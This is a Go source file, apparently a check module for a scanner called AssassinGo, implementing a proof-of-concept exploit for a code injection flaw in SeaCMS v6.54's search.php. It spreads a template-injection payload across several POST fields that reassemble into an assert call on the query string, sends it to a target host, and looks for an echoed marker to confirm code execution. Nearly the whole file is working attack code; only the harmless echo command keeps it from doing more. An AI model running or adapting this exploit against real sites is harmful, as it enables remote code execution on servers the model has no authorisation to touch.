package poc

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"
)

var payload = `
	"searchtype":"5",
	"searchword":"{if{searchpage:year}",
	"year":":as{searchpage:area}}",
	"area":"s{searchpage:letter}",
	"letter":"ert{searchpage:lang}",
	"yuyan":"($_SE{searchpage:jq}",
	"jq":"RVER{searchpage:ver}",
	"ver":"[QUERY_STRING]));/*"
`

// SeaCMSv654 search.php code injection.
type SeaCMSv654 struct {
	target  string
	Existed string
}

// NewSeaCMSv654 .
func NewSeaCMSv654() *SeaCMSv654 {
	return &SeaCMSv654{}
}

// Report impletements POC interface.
func (s *SeaCMSv654) Report() interface{} {
	return s.Existed
}

// Run impletements POC interface.
func (s *SeaCMSv654) Run(target string) {
	s.target = target
	s.check()
}

func (s *SeaCMSv654) check() {
	cmd := `?echo"AssassinGooo";`
	payload := url.Values{}
	payload.Add("searchtype", "5")
	payload.Add("searchword", "{if{searchpage:year}")
	payload.Add("year", ":as{searchpage:area}}")
	payload.Add("area", "s{searchpage:letter}")
	payload.Add("letter", "ert{searchpage:lang}")
	payload.Add("yuyan", "($_SE{searchpage:jq}")
	payload.Add("jq", "RVER{searchpage:ver}")
	payload.Add("ver", "[QUERY_STRING]));/*")

	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	req, _ := http.NewRequest("POST", "http://"+s.target+":8888/seacmsv6.54/upload/search.php"+cmd, strings.NewReader(payload.Encode()))

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("user-agent", "Mozilla/5.0 (compatible; AssassinGo/0.1)")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		s.Existed = "false"
		return
	}

	body, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if strings.Contains(string(body), "AssassinGooo") {
		fmt.Println(s.target, "POC Worked!")
		s.Existed = "true"
		return
	}
	fmt.Println(s.target, "not work")
}
